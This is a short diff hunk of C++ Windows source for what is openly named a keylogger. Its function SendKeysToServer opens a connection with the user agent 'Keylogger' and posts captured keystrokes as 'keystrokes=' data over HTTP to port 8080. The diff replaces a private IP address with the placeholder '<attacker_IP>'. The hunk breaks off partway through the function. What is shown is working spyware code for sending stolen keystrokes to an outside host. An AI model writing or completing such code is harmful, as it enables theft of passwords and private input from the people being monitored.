@@ -19,7 +19,7 @@ std::wstring StringToWide(const std::string& str) {
 void SendKeysToServer(const std::string& keys) {
     HINTERNET hInternet = InternetOpenW(L"Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
-        HINTERNET hConnect = InternetConnectW(hInternet, L"192.168.1.15", 8080, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET hConnect = InternetConnectW(hInternet, L"<attacker_IP>", 8080, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (hConnect) {
             const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded";  // Use wide strings for headers
             std::string data = "keystrokes=" + keys;  // Keep as std::string for content
